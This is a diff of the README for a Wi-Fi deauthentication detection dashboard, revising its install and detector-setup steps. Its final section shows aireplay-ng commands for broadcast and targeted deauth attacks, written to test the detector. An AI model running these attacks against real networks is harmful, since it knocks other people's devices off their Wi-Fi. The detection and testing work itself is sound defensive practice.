@@ -128,14 +128,30 @@ deauth_dashboard/
 - A Wi-Fi adapter that supports **monitor mode** (e.g. MediaTek MT7612U, Alfa AWUS036ACH)
 - `aircrack-ng` suite
 
-### Step 1 — Clone the repository
+### Step 1 — Download the zip
+
+Click the green **Code** button on this repository page and select **Download ZIP**, or use:
 
 ```bash
-git clone https://github.com/<your-username>/deauth-detection-dashboard.git
-cd deauth-detection-dashboard
+wget https://github.com/<your-username>/deauth-detection-dashboard/archive/refs/heads/main.zip
 ```
 
-### Step 2 — Run the setup script
+### Step 2 — Extract the zip
+
+```bash
+unzip main.zip
+cd deauth-detection-dashboard-main
+```
+
+Or if you downloaded it manually to your Downloads folder:
+
+```bash
+cd ~/Downloads
+unzip deauth-detection-dashboard-main.zip
+cd deauth-detection-dashboard-main
+```
+
+### Step 3 — Run the setup script
 
 ```bash
 sudo bash setup.sh wlan0 192.168.1.100
@@ -144,12 +160,14 @@ sudo bash setup.sh wlan0 192.168.1.100
 #                  interface
 ```
 
-This will:
+This will automatically:
 - Install all system and Python dependencies
 - Enable monitor mode on your adapter
 - Print your exact start command
 
-### Step 3 — Manual install (alternative)
+### Step 4 — Manual install (alternative to setup.sh)
+
+If you prefer to install manually:
 
 ```bash
 sudo apt update
@@ -163,19 +181,46 @@ pip3 install flask flask-socketio scapy eventlet --break-system-packages
 
 ### Detector PC
 
-**Step 1 — Enable monitor mode**
+**Step 1 — Navigate to the project folder**
+```bash
+cd deauth-detection-dashboard-main
+```
+
+**Step 2 — Find your WiFi interface name**
+```bash
+iw dev
+# Look for your adapter — usually wlan0 or wlan1
+```
+
+**Step 3 — Enable monitor mode**
 ```bash
 sudo airmon-ng check kill
 sudo airmon-ng start wlan0
-# Interface is now: wlan0mon
+# Your interface is now: wlan0mon
 ```
 
-**Step 2 — Lock to target channel**
+Verify monitor mode is active:
 ```bash
+iw dev
+# Should show: type monitor
+```
+
+**Step 4 — Find your webcam's IP on the network**
+```bash
+sudo apt install -y arp-scan
+sudo arp-scan --localnet
+# Look for your webcam's IP address e.g. 192.168.1.100
+```
+
+**Step 5 — Lock monitor interface to the target channel**
+```bash
+# First find the channel your target AP is on
+sudo airodump-ng wlan0mon
+# Then lock to that channel (e.g. channel 6)
 sudo iw dev wlan0mon set channel 6
 ```
 
-**Step 3 — Start the dashboard**
+**Step 6 — Start the dashboard**
 ```bash
 sudo python3 app.py -i wlan0mon --webcam 192.168.1.100
 ```
@@ -193,14 +238,24 @@ sudo python3 app.py \
   -v
 ```
 
-**Step 4 — Open the dashboard**
+**Step 7 — Open the dashboard in your browser**
 
-From any browser on the same network:
+Find your detector PC's IP:
+```bash
+hostname -I
+```
+
+Then open from **any browser on the same network**:
 ```
 http://<detector-pc-ip>:5000
 ```
 
-Find your IP with: `hostname -I`
+Wait for the baseline learning message:
+```
+[*] Learning baseline traffic for 15s ...
+[*] Baseline learning complete — detection ACTIVE
+```
+The detector is now live.
 
 ---
 
@@ -214,13 +269,13 @@ sudo airmon-ng start wlan1
 # Discover target AP
 sudo airodump-ng wlan1mon
 
-# Lock to target channel
+# Lock to target channel (Replace AA:BB:CC:DD:EE:FF with your network MAC)
 sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 wlan1mon
 
-# Launch broadcast deauth attack
+# Launch broadcast deauth attack 
 sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan1mon
 
-# Targeted attack against specific client
+# Targeted attack against specific client (After airodump, list of devices containing their MAC shows now replace victim's MAC with CLIENT:MAC)
 sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan1mon
 ```
 
